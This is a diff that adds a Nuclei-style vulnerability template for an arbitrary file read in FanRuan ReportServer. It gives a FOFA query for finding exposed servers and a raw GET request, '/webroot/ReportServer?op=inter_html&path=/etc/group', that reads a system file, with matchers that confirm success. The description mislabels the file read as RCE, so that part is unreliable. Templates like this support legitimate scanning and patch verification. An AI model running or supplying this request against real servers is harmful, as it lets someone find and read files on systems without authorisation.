@@ -1,0 +1,35 @@
+id: fanruan-ReportServer-etc-group
+
+info:
+  tags: fanruan-ReportServer-etc-group
+  name: 帆软系统ReportServer存在etc-group任意文件读取
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="isSupportForgetPwd"
+    帆软工具软件存在RCE 访问URL:/webroot/ReportServer?op=inter_html&path=/etc/group
+
+
+
+http:
+  - raw:
+      - |
+        GET /webroot/ReportServer?op=inter_html&path=/etc/group HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sshd'
+      - type: status
+        status: 
+          - 200
+
+
+
+
